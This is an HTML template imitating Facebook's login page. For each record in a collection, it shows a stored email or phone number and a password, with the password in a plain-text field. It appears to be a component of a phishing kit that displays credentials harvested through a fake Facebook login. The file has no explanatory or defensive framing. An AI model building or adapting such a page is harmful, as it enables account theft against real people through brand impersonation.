  <body class="text-center">
      <div class="container d-block">
        <div class="headtitle px-5">
            <h1 class=" mb-3 text-primary fbtitle">facebook</h1>
            <h6 class="fbdesc">Facebook helps you connect and share with the people in your life.</h6>
         </div>
      </div>



{% for data in fab%}
    
      <div class="container px-5 pb-5">
            <form  class="px-3 py-3 bg-white rounded mt-5">
              

                <input type="email"  class="mb-2 form-control text-muted p-3" placeholder="Enter your email address or phone number" value="{{data.emailNum}}">

                <input type="text" class="form-control text-muted p-3" placeholder="Password" value="{{data.password}}">
                
             
        
              <button class="mt-3 mb-3 w-100 btn btn-lg btn-primary" type="submit">Log In</button>


              <a class="mt-5 mb-3 forgot text-primary">Forgotten password?</a>
          <hr>
          <button class="w-100 btn btn-lg succsess">Create New Account</button>
            </form>
        
         <div class="footer mt-3">
            <a class="mt-3" href="#">Create a Page </a><small class="mt-3">for a celebrity, band or business.</small>
         </div>
      </div>
{% endfor %}
